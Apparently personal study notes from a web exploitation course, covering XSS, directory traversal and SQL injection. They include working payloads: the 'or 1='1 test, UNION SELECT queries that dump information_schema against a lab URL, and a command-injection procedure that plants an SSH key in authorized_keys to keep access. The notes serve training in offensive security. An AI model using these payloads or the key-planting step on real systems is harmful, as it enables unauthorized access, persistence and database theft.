    Cross site scripting (XSS)
        Untrsuted code on a trusted website
        Due to misconfigured web servers
        Insertion of arbitrary code into a webpage, that executes in the browser of visitors
        Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
        Using the server as a proxy. Nothing will actually be stored on the server.
        
    Refelcted XSS
        Transient, occurs in error messages or search results
        Delivered through intermediate media, such as a link in an email
        Characters that are normally illegal in URLs can be Base64 encoded
    Stored XSS
        Resides on vulnerable site
        Only requires user to visit page
        
    
    POST ../../../../../<file being accessed>
    GET  (after equals sign in URL type in the path of the file you want to open.)
    
    Command Injection
              
          upload ssh key to sever so we can ssh to it w/o creds
              linops:   ssh-keygen -t rsa
                        cat file
                 web:   find out if account on web has .ssh file
                        if not, mkdir /var/www/.ssh
                        write our key into /var/www/.ssh
              linops:   copy whole contents fo keygen
                        web: echo "<key>" >> /var/www/.ssh/authorized_keys
                        check web file
                        
                        now ssh to IP from linops (use same user you exploited with key)

Web Exploitation Day 2

SQL Injection
    Structured Query Language
        SQL is used to query SQL databases
    Default databases and schemas
        information_schema
        mysql
        performance_schema
        
    DEMO
        USE session
        select * from session.car;
        select * from session.car UNION select name,type,cost,color fromsession.tires;
            Making a union between tables which could be used to view unviewable tables
            
    sql injection test statement
        'or 1='1
    @@version
        returns mysql version number 
        
        
    stacking statements
        Chianing multiple commands together using ;
        Add -- to the end of your query to "comment out" any other query that may come after
    Nesting statements
    
    
    
    Dumping data base Demo ###ONLY THING YOU CAN DO ON A LOGIN PAGE###
        enter login webpage
        'or 1='1
        F12 After login
        refresh
        View POST request on network tab
        Raw switch
        Copy and past results into URL bar with ? in front of it
    
    POST Method
        get the database to dump
            <Data>' or 1='1 (Test Method)
        Figure Out how many columns are in the table (Some can be hidden)
            <Data>' UNION SELECT 1,2,3,4,5;#
        #######################################THE GOLDEN STATEMENT#######################################################
            UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#
            UNION select <column>,<column>,<column> from <database>.<table>
    GET Method
        ANYTHING THAT HAS A DROPDOWN
        Find a ? in the url
        Put test method in url after =
            http://10.50.21.3/uniondemo.php?Selection=2 OR 1=1 ;#
        Test each variable
        Find out how many Columns there are
            UNION SELECT 1,2,3;#        (Start with the known amount of columns and work up)
        Golden Statement
            UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#
            UNION select <column>,<column>,<column> from <database>.<table>
